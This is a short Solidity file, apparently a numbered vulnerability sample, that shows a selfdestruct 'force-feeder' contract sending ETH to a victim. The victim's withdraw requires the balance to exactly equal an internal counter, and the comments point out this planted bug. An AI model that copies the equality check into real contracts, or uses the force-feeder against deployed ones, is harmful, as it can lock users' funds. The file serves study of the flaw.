// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Attacker contract that force-feeds ETH via selfdestruct
contract ForceFeeder_47 {
    constructor(address payable target) payable {
        selfdestruct(target);  // bypasses fallback/receive - forced ETH acceptance
    }
}

contract VictimContract_47 {
    uint256 public expectedBalance;

    function deposit() external payable {
        expectedBalance += msg.value;
    }

    // BUG: actual balance may exceed expectedBalance due to force-fed ETH
    function withdraw() external {
        // This invariant can be broken by ForceFeeder
        require(address(this).balance == expectedBalance, "Balance mismatch");
        payable(msg.sender).transfer(expectedBalance);
        expectedBalance = 0;
    }

    receive() external payable { expectedBalance += msg.value; }
}